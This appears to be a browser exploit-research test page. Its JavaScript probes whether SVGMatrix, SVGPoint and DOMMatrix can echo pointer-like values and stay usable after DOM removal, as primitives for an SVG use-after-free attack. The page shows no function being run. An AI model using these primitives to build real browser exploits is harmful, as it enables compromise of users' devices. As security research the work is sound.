<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v50 — Address Oracle Probes</title>
<style>
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;font-size:13px;padding:16px;margin:0}
h2{color:#00ff88;margin:8px 0}
.suite{border:1px solid #333;margin:8px 0;padding:8px}
pre{white-space:pre-wrap;word-break:break-all;margin:2px 0}
</style>

<body>
<h2>SVG UAF v50 — Address Oracle: ADR1/ADR2/ADR3/ADR4</h2>
<div id="out"></div>
<script>
var SVG_NS='http://www.w3.org/2000/svg';
var log_lines=[];
function L(s){log_lines.push(s);var d=document.getElementById('out');var p=document.createElement('pre');p.textContent=s;d.appendChild(p);}

// helpers
function makeSVG(){
  var svg=document.createElementNS(SVG_NS,'svg');
  svg.setAttribute('width','1');svg.setAttribute('height','1');
  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
  document.body.appendChild(svg);
  return svg;
}
function removeSVG(svg){if(svg&&svg.parentNode)svg.parentNode.removeChild(svg);}
var _tmp=null;
function getTmp(){if(!_tmp){_tmp=document.createElementNS(SVG_NS,'svg');document.body.appendChild(_tmp);}return _tmp;}
function makeSVGNum(v){var n=getTmp().createSVGNumber();n.value=v;return n;}

// float64 bit manipulation via DataView
var _dv_buf=new ArrayBuffer(8);
var _dv=new DataView(_dv_buf);
function f64_to_u32pair(f){
  _dv.setFloat64(0,f,true); // little-endian
  return {lo:_dv.getUint32(0,true), hi:_dv.getUint32(4,true)};
}
function u32pair_to_f64(lo,hi){
  _dv.setUint32(0,lo,true);
  _dv.setUint32(4,hi,true);
  return _dv.getFloat64(0,true);
}
function f64_hex(f){
  var p=f64_to_u32pair(f);
  return '0x'+p.hi.toString(16).padStart(8,'0')+p.lo.toString(16).padStart(8,'0');
}
// encode integer K as float64 exactly (K must be safe integer)
function int_to_f64(k){return k;}  // JS numbers are f64, so just assign

// ─────────────────────────────────────────────────────────────────
// ADR1 — SVGMatrix.inverse() as Integer/Pointer Oracle
// If we write 1/K as float64 into matrix.a, inverse() gives us K back
// We probe with "pointer-like" values (upper bits set) to see if
// inverse() can echo back arbitrary 64-bit patterns
// ─────────────────────────────────────────────────────────────────
function runADR1(){
  L('');L('ADR1: SVGMatrix inverse() as address oracle');

  var svg=makeSVG();
  var g=document.createElementNS(SVG_NS,'g');
  svg.appendChild(g);
  var xfList=g.transform.baseVal;
  var xf=svg.createSVGTransform();
  xfList.appendItem(xf);
  var m=xfList.getItem(0).matrix;

  // identity: det=a*d-b*c=1, b=c=0, e=f=0
  // inv.a = d/det = 1, inv.b = -b/det = 0, etc
  // For det=1, a=d: inv.a=d, inv.d=a, inv.b=-b, inv.c=-c
  // Negation oracle: inv.e = -(a*f - d*e)/(det) for 2D
  // For a=d=1,b=c=0: inv.e = -(f - e) / 1 ??? let's test

  // Full inverse formula for 2D affine (a,b,c,d,e,f):
  // det = a*d - b*c
  // inv.a = d/det
  // inv.b = -b/det
  // inv.c = -c/det
  // inv.d = a/det
  // inv.e = (c*f - d*e)/det
  // inv.f = (b*e - a*f)/det

  // integer echo: set a=1/K, b=c=0, d=K (so det = (1/K)*K - 0 = 1)
  // inv.a = K/1 = K  ← echoes K back as float64!
  // inv.d = (1/K)/1 = 1/K

  L('ADR1: [Test 1] integer echo via a=1/K, d=K, b=c=e=f=0');
  var echo_tests=[
    {K:2,        name:'K=2'},
    {K:1000,     name:'K=1000'},
    {K:65536,    name:'K=65536'},
    {K:0x100000, name:'K=0x100000'},
    {K:0x1000000,name:'K=0x1000000'},
    {K:0xFFFFFF, name:'K=0xFFFFFF'},
    {K:1e9,      name:'K=1e9'},
    {K:1e12,     name:'K=1e12'},
    {K:1e15,     name:'K=1e15'},
    {K:Number.MAX_SAFE_INTEGER, name:'K=MAX_SAFE_INT'},
  ];
  var all_echo=true;
  for(var i=0;i<echo_tests.length;i++){
    var K=echo_tests[i].K;
    m.a=1/K; m.b=0; m.c=0; m.d=K; m.e=0; m.f=0;
    var inv=m.inverse();
    var got=inv.a;
    var exact=(got===K);
    if(!exact)all_echo=false;
    L('ADR1: a=1/'+K+' d='+K+' → inv.a='+got+' exact='+exact);
  }
  L('ADR1: all_echo='+all_echo);

  // Test 2: encode pointer-like 48-bit value via 1/K echo
  // Real iOS arm64 heap pointers are ~0x1xx_xxxxxxxx (tagged)
  // We simulate: K = 0x180001234  (a plausible heap addr)
  L('ADR1: [Test 2] pointer-like values');
  var ptr_tests=[
    0x180001234,
    0x1b0000000,
    0x100000001,
    0x1ffffffff,
    // max exact: 2^53-1 = 9007199254740991
    9007199254740991,
  ];
  for(var i=0;i<ptr_tests.length;i++){
    var K=ptr_tests[i];
    m.a=1/K; m.b=0; m.c=0; m.d=K; m.e=0; m.f=0;
    try{
      var inv=m.inverse();
      var got=inv.a;
      var exact=(got===K);
      L('ADR1: K=0x'+K.toString(16)+' → inv.a='+got+' hex='+f64_hex(got)+' exact='+exact);
    }catch(ex){L('ADR1: K=0x'+K.toString(16)+' THREW: '+ex.message);}
  }

  // Test 3: e-field pass-through oracle
  // det=1, a=d=1, b=c=0 → inv.e = (c*f - d*e)/det = (0 - 1*e)/1 = -e
  // So inv.e = -e exactly (negation oracle, confirmed v48)
  // Can we use TWO fields to pass through a full 64-bit value?
  // Encode: hi bits in e, lo bits in f, recover via inv
  L('ADR1: [Test 3] two-field 64-bit value encoding');
  // Use e and f fields:
  // a=d=1, b=c=0 → inv.e=-e, inv.f=-f
  // So we can pass two independent float64 values: e→-inv.e, f→-inv.f
  // Encode a 53-bit "pointer" split across e (high 26 bits) and f (low 27 bits)
  var target_ptr=0x1b000abcdef; // 44-bit value
  var hi_part=Math.floor(target_ptr/0x10000000); // top bits
  var lo_part=target_ptr - hi_part*0x10000000;   // bottom bits
  m.a=1; m.b=0; m.c=0; m.d=1; m.e=hi_part; m.f=lo_part;
  var inv3=m.inverse();
  var rec_hi=-inv3.e;
  var rec_lo=-inv3.f;
  var rec_ptr=rec_hi*0x10000000+rec_lo;
  L('ADR1: target_ptr=0x'+target_ptr.toString(16));
  L('ADR1: hi='+hi_part+' lo='+lo_part);
  L('ADR1: recovered hi='+rec_hi+' lo='+rec_lo+' → ptr=0x'+rec_ptr.toString(16));
  L('ADR1: two-field exact='+(rec_ptr===target_ptr));

  // Test 4: full 64-bit IEEE754 double encoding via a-field echo
  // Can we write arbitrary bit patterns as f64 and get them back?
  L('ADR1: [Test 4] arbitrary f64 bit pattern echo');
  // Encode: a = arbitrary float (including NaN, Inf, subnormal)
  // We need 1/K where K = our target, then inv.a = K
  // BUT: this requires K to be a finite nonzero value
  // For pointer echoing: K IS the pointer value (finite, nonzero, < 2^53)
  // Check upper limit
  var pow2_53=Math.pow(2,53);
  m.a=1/pow2_53; m.b=0; m.c=0; m.d=pow2_53; m.e=0; m.f=0;
  try{var inv4=m.inverse();L('ADR1: K=2^53 → inv.a='+inv4.a+' exact='+(inv4.a===pow2_53));}
  catch(ex){L('ADR1: K=2^53 THREW: '+ex.message);}

  var pow2_53p1=pow2_53+1; // not exactly representable!
  m.a=1/pow2_53p1; m.b=0; m.c=0; m.d=pow2_53p1; m.e=0; m.f=0;
  try{var inv4b=m.inverse();L('ADR1: K=2^53+1 → inv.a='+inv4b.a+' exact='+(inv4b.a===pow2_53p1)+' (precision limit)');}
  catch(ex){L('ADR1: K=2^53+1 THREW: '+ex.message);}

  removeSVG(svg);
  return {all_echo:all_echo};
}

// ─────────────────────────────────────────────────────────────────
// ADR2 — SVGPoint.matrixTransform() as computation oracle
// matrixTransform(SVGMatrix) → new SVGPoint
// x' = a*x + c*y + e
// y' = b*x + d*y + f
// Are inputs/outputs float64?
// ─────────────────────────────────────────────────────────────────
function runADR2(){
  L('');L('ADR2: SVGPoint.matrixTransform() oracle');

  var svg=makeSVG();
  // Get SVGPoint via createSVGPoint
  var pt=svg.createSVGPoint();

  // Get SVGMatrix via transform
  var g=document.createElementNS(SVG_NS,'g');
  svg.appendChild(g);
  var xf=svg.createSVGTransform();
  g.transform.baseVal.appendItem(xf);
  var m=g.transform.baseVal.getItem(0).matrix;

  // Test 1: basic computation check
  pt.x=3; pt.y=7;
  m.a=2; m.b=0; m.c=0; m.d=2; m.e=1; m.f=1;
  var r1=pt.matrixTransform(m);
  L('ADR2: [Test 1] pt=(3,7) m=(2,0,0,2,1,1) → expected (7,15) got=('+r1.x+','+r1.y+') exact='+(r1.x===7&&r1.y===15));

  // Test 2: float64 precision in inputs
  pt.x=1/3; pt.y=0;
  m.a=3; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
  var r2=pt.matrixTransform(m);
  L('ADR2: [Test 2] pt.x=1/3, m.a=3 → expected x=1 got='+r2.x+' exact='+(r2.x===1));

  // Test 3: large integer echo via point+matrix
  // x'=a*x+e. Set a=1,x=K,e=0 → x'=K
  // OR: a=K, x=1 → x'=K
  var K=0x180001234;
  pt.x=1; pt.y=0;
  m.a=K; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
  var r3=pt.matrixTransform(m);
  L('ADR2: [Test 3] K=0x'+K.toString(16)+' via a=K → x\'='+r3.x+' exact='+(r3.x===K));

  // Test 4: SVGPoint x field precision
  pt.x=1/3; var got_x=pt.x;
  L('ADR2: [Test 4] SVGPoint.x storage: wrote 1/3='+1/3+' got='+got_x+' f64='+(got_x===1/3)+' f32='+(got_x===Math.fround(1/3)));

  pt.x=Math.PI; var got_pi=pt.x;
  L('ADR2: [Test 4b] SVGPoint.x=π: got='+got_pi+' f64='+(got_pi===Math.PI)+' f32='+(got_pi===Math.fround(Math.PI)));

  // Test 5: can we set SVGPoint.x to a pointer-like value and read it back via matrixTransform?
  var target=0x1b0001234;
  pt.x=target; pt.y=0;
  m.a=1; m.b=0; m.c=0; m.d=1; m.e=0; m.f=0;
  var r5=pt.matrixTransform(m);
  L('ADR2: [Test 5] ptr echo: target=0x'+target.toString(16)+' → x\'='+r5.x+' exact='+(r5.x===target));

  // Test 6: orphan SVGPoint — does it stay alive?
  var pt2=svg.createSVGPoint();
  pt2.x=12345; pt2.y=67890;
  removeSVG(svg);  // remove SVG but keep pt2 reference
  try{L('ADR2: [Test 6] SVGPoint after SVG removal: x='+pt2.x+' y='+pt2.y+' ALIVE');}
  catch(ex){L('ADR2: [Test 6] SVGPoint DEAD: '+ex.message);}
  try{pt2.x=99999;L('ADR2: [Test 6b] SVGPoint write after SVG removal: x='+pt2.x+' WRITABLE');}
  catch(ex){L('ADR2: [Test 6b] THREW: '+ex.message);}

  return {};
}

// ─────────────────────────────────────────────────────────────────
// ADR3 — DOMMatrix operations as oracle
// DOMMatrix has 22 float64 fields (confirmed v48)
// Test: multiply(), translate(), invertSelf(), transformPoint()
// Can we encode/recover arbitrary 64-bit values through DOMMatrix math?
// ─────────────────────────────────────────────────────────────────
function runADR3(){
  L('');L('ADR3: DOMMatrix operations oracle');

  // Test 1: DOMMatrix.invertSelf() — same as SVGMatrix.inverse()?
  var dm=new DOMMatrix();
  dm.a=1/1000; dm.b=0; dm.c=0; dm.d=1000; dm.e=0; dm.f=0;
  var dm2=dm.inverse();
  L('ADR3: [Test 1] DOMMatrix.inverse(): a=1/1000 d=1000 → inv.a='+dm2.a+' exact='+(dm2.a===1000));

  // Test 2: DOMMatrix.multiply() — does it operate in float64?
  var dmA=new DOMMatrix([2,0,0,2,0,0]);
  var dmB=new DOMMatrix([3,0,0,3,0,0]);
  var dmC=dmA.multiply(dmB);
  L('ADR3: [Test 2] multiply (scale 2 × scale 3) → a='+dmC.a+' expected=6 exact='+(dmC.a===6));

  // Test 3: transformPoint() — same as matrixTransform but on DOMMatrix
  var pt=new DOMPoint(1/3, 0);
  var dmScale=new DOMMatrix([3,0,0,1,0,0]);
  var r=dmScale.transformPoint(pt);
  L('ADR3: [Test 3] transformPoint: pt.x=1/3, m.a=3 → x\'='+r.x+' exact='+(r.x===1));

  // Test 4: DOMMatrix m13/m14/m31... fields (3D fields)
  // These are the extra 16 fields beyond a/b/c/d/e/f
  // Test if they participate in computation
  var dm3d=new DOMMatrix();
  dm3d.m13=1/7; dm3d.m14=Math.PI;
  var read_m13=dm3d.m13; var read_m14=dm3d.m14;
  L('ADR3: [Test 4] 3D fields: m13=1/7 got='+read_m13+' f64='+(read_m13===1/7));
  L('ADR3: [Test 4b] m14=π got='+read_m14+' f64='+(read_m14===Math.PI));

  // Test 5: large integer echo via DOMMatrix.inverse()
  var K=0x1b0001234; // 44-bit pointer-like
  var dm5=new DOMMatrix();
  dm5.a=1/K; dm5.b=0; dm5.c=0; dm5.d=K; dm5.e=0; dm5.f=0;
  try{
    var inv5=dm5.inverse();
    L('ADR3: [Test 5] K=0x'+K.toString(16)+' → inv.a='+inv5.a+' exact='+(inv5.a===K));
  }catch(ex){L('ADR3: [Test 5] THREW: '+ex.message);}

  // Test 6: DOMMatrix.translate() — does it carry float64 through?
  var dm6=new DOMMatrix();
  var tx=0x1b0001234, ty=0x200001234;
  var dm6t=dm6.translate(tx,ty);
  L('ADR3: [Test 6] translate('+tx.toString(16)+','+ty.toString(16)+') → e='+dm6t.e+' f='+dm6t.f);
  L('ADR3: [Test 6] e_exact='+(dm6t.e===tx)+' f_exact='+(dm6t.f===ty));

  // Test 7: chain — encode ptr in translate, then inverse, recover
  // translate sets e=tx → inverse of translate: inv.e = -tx (negation oracle)
  var dm7=new DOMMatrix().translate(K, 0);
  try{
    var inv7=dm7.inverse();
    L('ADR3: [Test 7] translate(K) then inverse: inv.e='+inv7.e+' expected='+(-(K))+' exact='+(inv7.e===-(K)));
  }catch(ex){L('ADR3: [Test 7] THREW: '+ex.message);}

  return {};
}

// ─────────────────────────────────────────────────────────────────
// ADR4 — SVGMatrix storage: write float64 pattern, orphan, check survival
// We confirmed STO1: matrix fields are float64.
// Now: write pointer-like bits, orphan the transform, check if bits survive
// This tests: can we use SVGMatrix as a float64 "register" that holds
// arbitrary 64-bit values even after DOM removal?
// ─────────────────────────────────────────────────────────────────
function runADR4(){
  L('');L('ADR4: SVGMatrix as orphaned float64 register');

  var svg=makeSVG();
  var g=document.createElementNS(SVG_NS,'g');
  svg.appendChild(g);
  var xfList=g.transform.baseVal;
  var xf=svg.createSVGTransform();
  xfList.appendItem(xf);
  var m=xfList.getItem(0).matrix;

  // Write pointer-like values into all 6 fields
  var vals=[
    0x1b0001234,
    0x1b0005678,
    0x1c000abcd,
    0x1d000ef01,
    1/3,
    Math.PI
  ];
  m.a=vals[0]; m.b=vals[1]; m.c=vals[2]; m.d=vals[3]; m.e=vals[4]; m.f=vals[5];

  // Verify before orphan
  L('ADR4: [before orphan] a=0x'+m.a.toString(16)+' b=0x'+m.b.toString(16)+' e='+m.e+' f='+m.f);
  L('ADR4: a_exact='+(m.a===vals[0])+' b_exact='+(m.b===vals[1])+' e_exact='+(m.e===vals[4]));

  // Orphan: remove xf from list
  xfList.removeItem(0);
  // Remove g from SVG
  g.parentNode.removeChild(g);
  // Remove SVG from DOM
  removeSVG(svg);

  // Check if values survive
  try{
    var a_after=m.a; var b_after=m.b; var e_after=m.e; var f_after=m.f;
    L('ADR4: [after full orphan] a='+a_after+' b='+b_after+' e='+e_after+' f='+f_after);
    L('ADR4: a_survived='+(a_after===vals[0])+' b_survived='+(b_after===vals[1]));
    L('ADR4: e_survived='+(e_after===vals[4])+' f_survived='+(f_after===vals[5]));
    L('ADR4: ★ SVGMatrix holds float64 values after full orphan!');

    // Can we still call inverse() on orphaned matrix?
    m.a=1/1000; m.b=0; m.c=0; m.d=1000; m.e=12345; m.f=0;
    try{
      var inv_orp=m.inverse();
      L('ADR4: [orphaned matrix inverse()] inv.a='+inv_orp.a+' inv.e='+inv_orp.e);
      L('ADR4: inv_a_exact='+(inv_orp.a===1000)+' inv_e_exact='+(inv_orp.e===-12345));
      L('ADR4: ★ inverse() works on ORPHANED SVGMatrix!');
    }catch(ex){
      L('ADR4: orphaned inverse() THREW: '+ex.message);
    }
  }catch(ex){
    L('ADR4: [after full orphan] THREW: '+ex.message+' → matrix died');
  }

  // Test: get matrix from orphaned SVGTransform directly
  L('ADR4: [Sub-test B] access matrix from orphaned SVGTransform object');
  var svg2=makeSVG();
  var g2=document.createElementNS(SVG_NS,'g');
  svg2.appendChild(g2);
  var xf2=svg2.createSVGTransform();
  g2.transform.baseVal.appendItem(xf2);
  // Remove from DOM but keep xf2 reference
  g2.transform.baseVal.removeItem(0);
  g2.parentNode.removeChild(g2);
  removeSVG(svg2);
  try{
    var m2=xf2.matrix; // access matrix on orphaned transform
    m2.a=0xdeadbeef;
    L('ADR4: [B] xf2.matrix.a after orphan: wrote 0xdeadbeef, got='+m2.a+' hex=0x'+m2.a.toString(16));
    L('ADR4: [B] exact='+(m2.a===0xdeadbeef));
  }catch(ex){
    L('ADR4: [B] THREW: '+ex.message);
  }

  // Test: DOMMatrix as register — write bits, read back, all 22 fields
  L('ADR4: [Sub-test C] DOMMatrix as float64 register (all 22 fields)');
  var dm=new DOMMatrix();
  var fields=['a','b','c','d','e','f','m11','m12','m13','m14','m21','m22','m23','m24','m31','m32','m33','m34','m41','m42','m43','m44'];
  var ptr_base=0x1b0000000;
  var all_exact=true;
  for(var i=0;i<fields.length;i++){
    var v=ptr_base+i*0x1234;
    dm[fields[i]]=v;
    var got=dm[fields[i]];
    if(got!==v){all_exact=false;L('ADR4: [C] field '+fields[i]+' MISMATCH: wrote='+v+' got='+got);}
  }
  L('ADR4: [C] DOMMatrix all 22 fields exact: '+all_exact);
  if(all_exact){
    L('ADR4: ★★ DOMMatrix = 176-byte float64 register, all fields hold arbitrary values');
  }

  return {};
}

// ─────────────────────────────────────────────────────────────────
// ADR5 — Bonus: getBoundingClientRect / getComputedStyle leak probe
// Do any layout APIs leak internal values that correlate with addresses?
// ─────────────────────────────────────────────────────────────────
function runADR5(){
  L('');L('ADR5: Layout/Style leak probe');

  // getBoundingClientRect returns DOMRect — all float64 values
  // These are computed from layout engine, not directly from addresses
  // But: do precision artifacts appear? Do large SVGLength values cause issues?
  var svg=makeSVG();
  svg.style.cssText='position:fixed;top:0;left:0;width:1000px;height:1000px;opacity:0';
  var rect=document.createElementNS(SVG_NS,'rect');
  rect.setAttribute('x','0');
  rect.setAttribute('y','0');
  rect.setAttribute('width','100');
  rect.setAttribute('height','100');
  svg.appendChild(rect);

  var br=rect.getBoundingClientRect();
  L('ADR5: [rect BBCR] x='+br.x+' y='+br.y+' w='+br.width+' h='+br.height);

  // Set large width via orphaned SVGLength
  var lenRef=rect.width.baseVal;
  rect.parentNode.removeChild(rect);  // orphan
  lenRef.value=1e15;  // write large value to orphaned SVGLength
  // Re-add rect
  svg.appendChild(rect);
  var br2=rect.getBoundingClientRect();
  L('ADR5: [after large orphan write] w='+br2.width+' (wrote 1e15 via orphan)');

  // getComputedStyle
  var cs=window.getComputedStyle(svg);
  L('ADR5: computed transform='+cs.transform);

  // CTM / getScreenCTM — do these use float64?
  try{
    var ctm=svg.getCTM();
    if(ctm) L('ADR5: getCTM() a='+ctm.a+' e='+ctm.e+' f='+ctm.f);
    else L('ADR5: getCTM() returned null');
    var sctm=svg.getScreenCTM();
    if(sctm) L('ADR5: getScreenCTM() a='+sctm.a+' e='+sctm.e+' f='+sctm.f);
  }catch(ex){L('ADR5: CTM THREW: '+ex.message);}

  // SVGMatrix from getCTM — is it the same C++ type? Can we write to it?
  try{
    var ctm2=svg.getCTM();
    if(ctm2){
      ctm2.e=12345.678;
      L('ADR5: getCTM() matrix write: e='+ctm2.e+' f64='+(ctm2.e===12345.678));
    }
  }catch(ex){L('ADR5: getCTM write THREW: '+ex.message);}

  removeSVG(svg);
}

// ─────────────────────────────────────────────────────────────────
